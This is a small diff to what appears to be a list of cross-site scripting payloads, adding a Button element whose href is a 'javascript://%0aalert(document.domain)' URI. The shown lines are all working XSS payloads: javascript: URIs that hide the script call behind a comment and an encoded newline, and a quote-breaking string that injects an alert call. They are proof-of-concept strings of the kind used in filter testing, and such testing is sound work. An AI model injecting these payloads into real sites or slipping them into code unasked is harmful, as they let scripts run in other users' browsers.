@@ -4,3 +4,4 @@
 - javascript:/**/%0aalert()
 - javascript://%0aalert(1)
 - Ah'-alert('k0imet')-'?=
+- <Button href="javascript://%0aalert(document.domain)">XSS</Button>
